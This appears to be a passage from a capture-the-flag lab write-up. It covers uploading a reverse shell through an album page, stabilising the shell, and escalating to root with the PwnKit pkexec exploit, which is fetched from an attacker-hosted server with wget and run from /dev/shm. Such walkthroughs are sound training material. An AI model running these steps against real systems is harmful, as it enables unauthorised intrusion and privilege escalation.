OKK !! We are in so now while walking an application i found a page " Albums " So after visiting i saw upload functionality.
![7 1 moving](https://user-images.githubusercontent.com/75413146/153705192-774e205e-dbc9-4382-bd2f-bec004592da2.png)


`--------------------------------`
So edited my reverse shell with my IP and my favorite port
![6  3 Editing shell IP](https://user-images.githubusercontent.com/75413146/153705281-c31231ce-9b1a-4304-9b27-c9a443c1f54a.png)


Whoop Whoop we got shell... OKKK first things first let's stabilise our shell. I learned stabilising from What the Shell room on Tryhackme.
- export TERM=xterm
- which python3 [ Will allow to know what python is installed ]
- python3 -c 'import pty;pty.spawn("/bin/bash")'
- press CTRL+Z to bcakground the shell and also run the command on attacker machine
- stty raw -echo ; fg
- reset
- [ This commands will give us a fully functional shell ]

By resetting you get your shell reset like below a clean shell :D

Privilege Escalation TIIIIIIIIIIIME !!!!
	- For privesc you can run linpeas or any other script or may enumerate manually for escalation.
	- But in this writeup we will run PwnKit to learn some new about POLKIT pkexec module exploit. The exploit code can be found here -> https://github.com/ly4k/PwnKit/blob/main/PwnKit.c 
        ![10  enumerating privesc](https://user-images.githubusercontent.com/75413146/153705878-b9531579-e336-44f6-bc6f-a5f328428b81.png)
      - Let's do this...
      Compiling the code by 
      - gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
         ![11  1 pkexec binary](https://user-images.githubusercontent.com/75413146/153705895-3944080b-9a45-4fda-ab70-b09be5dc796c.png)
We got the binary compiled and now let's move this to victim host.
- 1st host a server on attacker machine we can do this by [Note : Host the server where your binary file is ! ]
- Command : python3 -m http.server 80
- 2nd  Go to victim terminal and download the binary by following 
- Command : wget http://[attackerIP:PORT]/file_name

![12  Tranferring binary](https://user-images.githubusercontent.com/75413146/153705932-8b8fc8a4-8b4c-4c3b-bd0a-c459c21fbfc6.png)

Also note the workding directory i am in /dev/shm. You must have a writable permission on a directory. Like /tmp or /dev/shm or /var/tmp
Now we got the binary so let's make it executable by using command : 
- chmod +x PwnKit

Let's now run the binary 
          ![13  Got Shell](https://user-images.githubusercontent.com/75413146/153706089-1213c008-3b53-42d1-b140-c7ccdd2a82d2.png)

So let's get the flags and end it ASAP.
- /home/mike has user.txt
- /root/ has root.txt
